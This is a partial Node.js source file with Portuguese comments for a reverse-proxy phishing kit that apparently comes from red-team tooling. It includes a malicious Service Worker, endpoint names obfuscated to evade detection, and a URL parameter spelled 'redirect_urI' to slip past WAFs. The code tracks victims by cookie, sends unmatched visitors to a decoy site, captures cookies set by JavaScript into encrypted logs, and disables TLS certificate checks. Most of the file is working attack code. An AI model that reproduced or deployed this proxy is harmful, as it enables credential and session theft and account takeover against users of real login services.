// Importa o módulo HTTP nativo do Node.js para criar o servidor proxy (sem TLS).
const http = require("http");
// Importa o módulo HTTPS para realizar requisições ao site alvo (com TLS).
const https = require("https");
// Importa o módulo path para manipulação de caminhos de arquivo.
const path = require("path");
// Importa o módulo fs para leitura/escrita de arquivos (logs, HTML, JS).
const fs = require("fs");
// Importa o módulo zlib para descompressão de respostas gzip/deflate do alvo.
const zlib = require("zlib");
// Importa o módulo crypto para criptografia AES-256-CTR dos logs capturados.
const crypto = require("crypto");


// URL de entrada do phishing — simula uma página de login legítima com parâmetros realistas.
// Quando a vítima acessa esta URL, o proxy identifica que é uma sessão de phishing nova.
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
// Nome do parâmetro que contém a URL real do alvo que será proxiada.
// Usa "I" maiúsculo no final ("redirect_urI") para dificultar detecção por WAFs/filtros.
const PHISHED_URL_PARAMETER = "redirect_urI";
// Regex para extrair o valor do parâmetro redirect_urI da URL usando lookbehind.
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
// URL para onde visitantes sem sessão válida são redirecionados (evita expor a infra).
const REDIRECT_URL = "https://www.intrinsec.com/";

// Mapeamento dos arquivos estáticos servidos pelo proxy:
// index: página HTML inicial exibida à vítima; notFound: página 404 falsa; script: JS injetado.
const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
// Mapeamento dos endpoints internos do proxy com nomes ofuscados para dificultar detecção.
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",            // Endpoint principal — recebe todas as requisições interceptadas pelo SW
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js", // Serve o arquivo do Service Worker malicioso
    script: "/@",                               // Endpoint para servir o script JS injetado
    mutation: "/Mutation_o5y3f4O7jMGW",         // Endpoint para reescrever URLs de links/formulários dinâmicos
    jsCookie: "/JSCookie_6X7dRqLg90mH",         // Endpoint para receber e registrar cookies JS exfiltrados
    favicon: "/favicon.ico"                     // Tratamento especial para favicon (redireciona ao alvo)
};

// Define e cria o diretório onde os logs de phishing criptografados serão armazenados.
const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
    // Cria o diretório de logs se ainda não existir.
    if (!fs.existsSync(LOGS_DIRECTORY)) {
        fs.mkdirSync(LOGS_DIRECTORY);
    }
} catch (error) {
    displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
// Objeto que armazena os streams de escrita abertos para cada sessão de vítima (um arquivo de log por sessão).
const LOG_FILE_STREAMS = {};
// Chave de criptografia AES-256-CTR usada para criptografar os logs capturados.
// AVISO do próprio autor: deve ser alterada e armazenada de forma mais segura em engajamentos reais.
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

// Objeto que mantém o estado de todas as sessões ativas de vítimas (mapeado por nome de cookie).
const VICTIM_SESSIONS = {}


// Cria o servidor HTTP que age como proxy reverso entre a vítima e o site alvo.
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    // Extrai método, URL e cabeçalhos da requisição recebida da vítima.
    const { method, url, headers } = clientRequest;
    // Tenta identificar a sessão da vítima pelo cookie de rastreamento enviado.
    const currentSession = getUserSession(headers.cookie);

    // ── CASO 1: Primeira visita da vítima ao link de phishing ──────────────────
    // Verifica se a URL corresponde ao ponto de entrada e contém o parâmetro de alvo.
    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            // Extrai e decodifica a URL real do alvo embutida no parâmetro redirect_urI.
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            // Se a vítima não possui sessão (primeira visita), gera uma nova sessão.
            if (!currentSession) {
                // Gera um novo cookie de rastreamento e armazena a sessão em VICTIM_SESSIONS.
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                // Define o cookie de rastreamento no navegador da vítima (90 dias, Secure, HttpOnly).
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            // Registra os dados do site alvo na sessão da vítima para uso nas requisições proxy.
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol; // Protocolo (https:)
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname; // Hostname do alvo (ex: login.microsoft.com)
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`; // Caminho + query string do alvo
            VICTIM_SESSIONS[session].port = phishedURL.port;         // Porta do alvo
            VICTIM_SESSIONS[session].host = phishedURL.host;         // Host completo do alvo

            // Responde com status 200 e serve a página HTML inicial que registra o Service Worker.
            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse); // Envia o HTML de bootstrap do SW
        }
        catch (error) {
            displayError("Phishing URL parsing failed", error, url);
            // Em caso de erro, exibe a página 404 falsa.
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
    }

    // ── CASO 2: Sessão existente OU requisição ao endpoint proxy principal ─────
    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        // Sub-caso 2a: Serve o arquivo do Service Worker malicioso quando solicitado.
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { "Content-Type": "text/javascript" }); // Content-Type JS obrigatório para SW
            fs.createReadStream(url.slice(1)).pipe(clientResponse); // Remove a "/" inicial e lê o arquivo local
        }
        // Sub-caso 2b: Redireciona requisição de favicon para o site alvo real.
        else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        }

        // Sub-caso 2c: Processa qualquer outra requisição (proxying principal).
        else {
            let clientRequestBody = []; // Buffer para acumular chunks do corpo da requisição
            clientRequest
                .on("error", (error) => {
                    displayError("Client request body retrieval failed", error, method, url); // Loga erros de leitura
                })
                .on("data", (chunk) => {
                    clientRequestBody.push(chunk); // Acumula cada chunk do corpo recebido
                })
                .on("end", () => {
                    // Concatena todos os chunks em uma string quando o corpo foi totalmente recebido.
                    clientRequestBody = Buffer.concat(clientRequestBody).toString();

                    // ── Sub-caso: Vítima sem sessão enviando requisição ao endpoint proxy ──
                    if (!currentSession) {
                        if (clientRequestBody) {
                            try {
                                // Tenta parsear o corpo como JSON (formato enviado pelo SW).
                                clientRequestBody = JSON.parse(clientRequestBody);
                                // Extrai a URL original da requisição interceptada pelo SW.
                                const proxyRequestURL = new URL(clientRequestBody.url);
                                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                // Verifica se a URL interceptada é o ponto de entrada do phishing (SW registrado antes do cookie).
                                if (proxyRequestURL.hostname === headers.host &&
                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    try {
                                        // Extrai a URL alvo do parâmetro redirect_urI da requisição interceptada.
                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                        // Gera nova sessão e define o cookie de rastreamento.
                                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);

                                        // Registra os dados do alvo na nova sessão.
                                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                        // Redireciona a vítima para o alvo passando pelo domínio do proxy.
                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                        clientResponse.end();
                                    }
                                    catch (error) {
                                        displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                    }
                                } else {
                                    // URL não corresponde ao phishing: redireciona para o site de fachada.
                                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                    clientResponse.end();
                                }
                            } catch (error) {
                                displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                            }
                        } else {
                            // Sem corpo e sem sessão: redireciona para o site de fachada.
                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
                            clientResponse.end();
                        }
                    }

                    // ── Sub-caso: Vítima com sessão válida — proxying principal ──────────
                    else {
                        // Obtém o protocolo do alvo a partir da sessão da vítima.
                        let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                        // Monta as opções da requisição que será feita ao site alvo real.
                        const proxyRequestOptions = {
                            hostname: VICTIM_SESSIONS[currentSession].hostname, // Host real do alvo
                            port: VICTIM_SESSIONS[currentSession].port,         // Porta do alvo
                            method: method,                                      // Repassa o método HTTP original
                            path: VICTIM_SESSIONS[currentSession].path,         // Caminho atual da sessão no alvo
                            headers: { ...headers },                             // Repassa todos os cabeçalhos da vítima
                            rejectUnauthorized: false                            // Ignora erros de certificado TLS (útil para alvos com cert inválido)
                        };
                        let isNavigationRequest = false; // Flag para identificar requisições de navegação (mudança de página)

                        if (clientRequestBody) {
                            // Sub-caso: Exfiltração de cookie definido via JavaScript.
                            if (url === PROXY_PATHNAMES.jsCookie) {
                                // Atualiza os cookies da sessão com o cookie JS recebido e exfiltra-o nos logs.
                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                                // Obtém a lista de domínios válidos (proxy + alvo) para reescrita de Domain no cookie.
                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                // Retorna a lista de domínios válidos ao script injetado no browser da vítima.
                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                clientResponse.end(JSON.stringify(validDomains));
                                return; // Encerra o processamento desta requisição
                            }
                            // (demais sub-casos do proxy principal continuam abaixo no arquivo original)
                        }
                    }
                });
        }
    }
});
